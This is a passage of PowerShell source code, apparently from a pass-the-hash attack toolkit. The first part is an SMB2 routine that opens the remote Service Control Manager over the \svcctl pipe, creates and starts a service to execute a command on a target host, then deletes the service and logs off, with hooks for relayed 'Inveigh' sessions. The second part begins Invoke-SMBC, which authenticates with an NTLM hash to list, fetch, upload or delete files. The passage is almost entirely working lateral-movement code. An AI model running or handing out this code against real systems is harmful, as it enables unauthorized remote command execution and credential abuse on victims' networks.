                            $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x00,0x00
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID ($RPC_data.Length + $SCM_data.Length)     
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                            $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                            $stage = 'SendReceive'
                        }
                    
                        'CreateRequest'
                        {
                            $stage_current = $stage
                            $SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \svcctl
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x05,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $packet_SMB2_data = New-PacketSMB2CreateRequestFile $SMB_named_pipe_bytes
                            $packet_SMB2_data["Share_Access"] = 0x07,0x00,0x00,0x00  
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data  
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data  
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                            try
                            {
                                $client_stream.Write($client_send,0,$client_send.Length) > $null
                                $client_stream.Flush()
                                $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                                if(Get-StatusPending $client_receive[12..15])
                                {
                                    $stage = 'StatusPending'
                                }
                                else
                                {
                                    $stage = 'StatusReceived'
                                }

                            }
                            catch
                            {
                                Write-Output "[-] Session connection is closed"
                                $stage = 'Exit'
                            }                    

                        }

                        'CreateServiceW'
                        {
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID ($RPC_data.Length + $SCM_data.Length)
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                            $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                            $stage = 'SendReceive'
                        }

                        'CreateServiceW_First'
                        {
                            $stage_current = $stage
                            $SMB_split_stage_final = [Math]::Ceiling($SCM_data.Length / $SMB_split_index)
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                            
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $SCM_data_first = $SCM_data[0..($SMB_split_index - 1)]
                            $packet_RPC_data = New-PacketRPCRequest 0x01 0 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_first
                            $packet_RPC_data["AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length)
                            $SMB_split_index_tracker = $SMB_split_index
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID $RPC_data.Length
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                            $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
                            $stage = 'SendReceive'
                        }

                        'CreateServiceW_Middle'
                        {
                            $stage_current = $stage
                            $SMB_split_stage++
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                            
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $SCM_data_middle = $SCM_data[$SMB_split_index_tracker..($SMB_split_index_tracker + $SMB_split_index - 1)]
                            $SMB_split_index_tracker += $SMB_split_index
                            $packet_RPC_data = New-PacketRPCRequest 0x00 0 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_middle
                            $packet_RPC_data["AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length - $SMB_split_index_tracker + $SMB_split_index)
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID $RPC_data.Length
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                            $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
                            $stage = 'SendReceive'
                        }

                        'CreateServiceW_Last'
                        {
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                            
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $SCM_data_last = $SCM_data[$SMB_split_index_tracker..$SCM_data.Length]
                            $packet_RPC_data = New-PacketRPCRequest 0x02 0 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_last
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID $RPC_data.Length
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                            $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
                            $stage = 'SendReceive'
                        }

                        'DeleteServiceW'
                        { 

                            if([System.BitConverter]::ToString($client_receive[108..111]) -eq '1d-04-00-00')
                            {
                                Write-Output "[+] Command executed with service $SMB_service on $Target"
                            }
                            elseif([System.BitConverter]::ToString($client_receive[108..111]) -eq '02-00-00-00')
                            {
                                Write-Output "[-] Service $SMB_service failed to start on $Target"
                            }

                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                            
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00
                            }

                            $packet_SCM_data = New-PacketSCMDeleteServiceW $SMB_service_context_handle
                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                            $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x02,0x00
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID ($RPC_data.Length + $SCM_data.Length)
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                            $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                            $stage = 'SendReceive'
                        }

                        'Logoff'
                        {
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x02,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }
            
                            $packet_SMB2_data = New-PacketSMB2SessionLogoffRequest
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                            $stage = 'SendReceive'
                        }

                        'OpenSCManagerW'
                        {
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $packet_SCM_data = New-PacketSCMOpenSCManagerW $SMB_service_bytes $SMB_service_length
                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                            $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID ($RPC_data.Length + $SCM_data.Length)
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                            $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                            $stage = 'SendReceive'
                        }

                        'ReadRequest'
                        {
                            Start-Sleep -m $Sleep
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x08,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $packet_SMB2_data = New-PacketSMB2ReadRequest $file_ID
                            $packet_SMB2_data["Length"] = 0xff,0x00,0x00,0x00
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data 
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data 
                            $stage = 'SendReceive'
                        }
                    
                        'RPCBind'
                        {
                            $stage_current = $stage
                            $SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \svcctl
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $packet_RPC_data = New-PacketRPCBind 0x48,0x00 1 0x01 0x00,0x00 $named_pipe_UUID 0x02,0x00
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID $RPC_data.Length
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                            $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
                            $stage = 'SendReceive'
                        }

                        'SendReceive'
                        {
                            $client_stream.Write($client_send,0,$client_send.Length) > $null
                            $client_stream.Flush()
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                            if(Get-StatusPending $client_receive[12..15])
                            {
                                $stage = 'StatusPending'
                            }
                            else
                            {
                                $stage = 'StatusReceived'
                            }

                        }

                        'StartServiceW'
                        {
                        
                            if([System.BitConverter]::ToString($client_receive[132..135]) -eq '00-00-00-00')
                            {
                                Write-Verbose "Service $SMB_service created on $Target"
                                $SMB_service_context_handle = $client_receive[112..131]
                                $stage_current = $stage
                                $message_ID++
                                $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                            
                                if($SMB_signing)
                                {
                                    $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                                }

                                $packet_SCM_data = New-PacketSCMStartServiceW $SMB_service_context_handle
                                $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                                $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x13,0x00
                                $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                                $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID ($RPC_data.Length + $SCM_data.Length)
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                                $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data   
                                $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                                if($SMB_signing)
                                {
                                    $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                                    $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                    $SMB2_signature = $SMB2_signature[0..15]
                                    $packet_SMB2_header["Signature"] = $SMB2_signature
                                    $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                                }

                                $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                                Write-Verbose "[*] Trying to execute command on $Target"
                                $stage = 'SendReceive'
                            }
                            elseif([System.BitConverter]::ToString($client_receive[132..135]) -eq '31-04-00-00')
                            {
                                Write-Output "[-] Service $SMB_service creation failed on $Target"
                                $stage = 'Exit'
                            }
                            else
                            {
                                Write-Output "[-] Service creation fault context mismatch"
                                $stage = 'Exit'
                            }
    
                        }
                
                        'StatusPending'
                        {
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                            
                            if([System.BitConverter]::ToString($client_receive[12..15]) -ne '03-01-00-00')
                            {
                                $stage = 'StatusReceived'
                            }

                        }

                        'StatusReceived'
                        {

                            switch ($stage_current)
                            {

                                'CloseRequest'
                                {
                                    $stage = 'TreeDisconnect'
                                }

                                'CloseServiceHandle'
                                {

                                    if($SMB_close_service_handle_stage -eq 2)
                                    {
                                        $stage = 'CloseServiceHandle'
                                    }
                                    else
                                    {
                                        $stage = 'CloseRequest'
                                    }

                                }

                                'CreateRequest'
                                {
                                    $file_ID = $client_receive[132..147]

                                    if($Refresh -and $stage -ne 'Exit')
                                    {
                                        Write-Output "[+] Session refreshed"
                                        $stage = 'Exit'
                                    }
                                    elseif($stage -ne 'Exit')
                                    {
                                        $stage = 'RPCBind'
                                    }

                                }

                                'CreateServiceW'
                                {
                                    $stage = 'ReadRequest'
                                    $stage_next = 'StartServiceW'
                                }

                                'CreateServiceW_First'
                                {

                                    if($SMB_split_stage_final -le 2)
                                    {
                                        $stage = 'CreateServiceW_Last'
                                    }
                                    else
                                    {
                                        $SMB_split_stage = 2
                                        $stage = 'CreateServiceW_Middle'
                                    }
                                    
                                }

                                'CreateServiceW_Middle'
                                {

                                    if($SMB_split_stage -ge $SMB_split_stage_final)
                                    {
                                        $stage = 'CreateServiceW_Last'
                                    }
                                    else
                                    {
                                        $stage = 'CreateServiceW_Middle'
                                    }

                                }

                                'CreateServiceW_Last'
                                {
                                    $stage = 'ReadRequest'
                                    $stage_next = 'StartServiceW'
                                }

                                'DeleteServiceW'
                                {
                                    $stage = 'ReadRequest'
                                    $stage_next = 'CloseServiceHandle'
                                    $SMB_close_service_handle_stage = 1
                                }

                                'Logoff'
                                {
                                    $stage = 'Exit'
                                }

                                'OpenSCManagerW'
                                {
                                    $stage = 'ReadRequest'
                                    $stage_next = 'CheckAccess' 
                                }

                                'ReadRequest'
                                {
                                    $stage = $stage_next
                                }

                                'RPCBind'
                                {
                                    $stage = 'ReadRequest'
                                    $stage_next = 'OpenSCManagerW'
                                }

                                'StartServiceW'
                                {
                                    $stage = 'ReadRequest'
                                    $stage_next = 'DeleteServiceW'  
                                }

                                'TreeConnect'
                                {
                                    $tree_ID = $client_receive[40..43]
                                    $stage = 'CreateRequest'
                                }

                                'TreeDisconnect'
                                {

                                    if($inveigh_session -and !$Logoff)
                                    {
                                        $stage = 'Exit'
                                    }
                                    else
                                    {
                                        $stage = 'Logoff'
                                    }

                                }

                            }

                        }
                    
                        'TreeConnect'
                        {
                            $tree_ID = $client_receive[40..43]
                            $message_ID++
                            $stage_current = $stage
                            $packet_SMB2_header = New-PacketSMB2Header 0x03,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $packet_SMB2_data = New-PacketSMB2TreeConnectRequest $SMB_path_bytes
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data 
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                            try
                            {
                                $client_stream.Write($client_send,0,$client_send.Length) > $null
                                $client_stream.Flush()
                                $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                                if(Get-StatusPending $client_receive[12..15])
                                {
                                    $stage = 'StatusPending'
                                }
                                else
                                {
                                    $stage = 'StatusReceived'
                                }
                            }
                            catch
                            {
                                Write-Output "[-] Session connection is closed"
                                $stage = 'Exit'
                            }
                            
                        }

                        'TreeDisconnect'
                        {
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x04,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }
            
                            $packet_SMB2_data = New-PacketSMB2TreeDisconnectRequest
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                            $stage = 'SendReceive'
                        }
    
                    }
                
                }

            }
            catch
            {
                Write-Output "[-] $($_.Exception.Message)"
            }
        
        }

    }

    if($inveigh_session -and $Inveigh)
    {
        $inveigh.session_lock_table[$session] = 'open'
        $inveigh.session_message_ID_table[$session] = $message_ID
        $inveigh.session[$session] | Where-Object {$_."Last Activity" = Get-Date -format s}
    }

    if(!$inveigh_session -or $Logoff)
    {
        $client.Close()
        $client_stream.Close()
    }

}

}

function Invoke-SMBC
{
[CmdletBinding(DefaultParametersetName='Default')]
param
(
    [parameter(Mandatory=$false)][ValidateSet("List","Recurse","Get","Put","Delete")][String]$Action = "List",
    [parameter(Mandatory=$false)][String]$Destination,
    [parameter(ParameterSetName='Auth',Mandatory=$true)][String]$Username,
    [parameter(ParameterSetName='Auth',Mandatory=$false)][String]$Domain,
    [parameter(Mandatory=$true)][Object]$Source,
    [parameter(ParameterSetName='Auth',Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,
    [parameter(Mandatory=$false)][Switch]$Modify,
    [parameter(Mandatory=$false)][Switch]$NoProgress,
    [parameter(Mandatory=$false)][ValidateSet("Auto","1","2.1")][String]$Version="Auto",
    [parameter(ParameterSetName='Session',Mandatory=$false)][Int]$Session,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Logoff,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Refresh,
    [parameter(Mandatory=$false)][Int]$Sleep=100
)

if($Version -eq '1')
{
    $SMB_version = 'SMB1'
}
elseif($Version -eq '2.1')
{
    $SMB_version = 'SMB2.1'
}

if($PsCmdlet.ParameterSetName -ne 'Auth' -and $PsCmdlet.ParameterSetName -ne 'Session')
{
    $signing_check = $true
}

function ConvertFrom-PacketOrderedDictionary
{
    param($ordered_dictionary)

    ForEach($field in $ordered_dictionary.Values)
    {
        $byte_array += $field
    }

    return $byte_array
}

#NetBIOS

function New-PacketNetBIOSSessionService
{
    param([Int]$HeaderLength,[Int]$DataLength)

    [Byte[]]$length = ([System.BitConverter]::GetBytes($HeaderLength + $DataLength))[2..0]

    $NetBIOSSessionService = New-Object System.Collections.Specialized.OrderedDictionary
    $NetBIOSSessionService.Add("MessageType",[Byte[]](0x00))
    $NetBIOSSessionService.Add("Length",$length)

    return $NetBIOSSessionService
}

#SMB1

function New-PacketSMBHeader
{
    param([Byte[]]$Command,[Byte[]]$Flags,[Byte[]]$Flags2,[Byte[]]$TreeID,[Byte[]]$ProcessID,[Byte[]]$UserID)

    $ProcessID = $ProcessID[0,1]

    $SMBHeader = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBHeader.Add("Protocol",[Byte[]](0xff,0x53,0x4d,0x42))
    $SMBHeader.Add("Command",$Command)
    $SMBHeader.Add("ErrorClass",[Byte[]](0x00))
    $SMBHeader.Add("Reserved",[Byte[]](0x00))
    $SMBHeader.Add("ErrorCode",[Byte[]](0x00,0x00))
    $SMBHeader.Add("Flags",$Flags)
    $SMBHeader.Add("Flags2",$Flags2)
    $SMBHeader.Add("ProcessIDHigh",[Byte[]](0x00,0x00))
    $SMBHeader.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMBHeader.Add("Reserved2",[Byte[]](0x00,0x00))
    $SMBHeader.Add("TreeID",$TreeID)
    $SMBHeader.Add("ProcessID",$ProcessID)
    $SMBHeader.Add("UserID",$UserID)
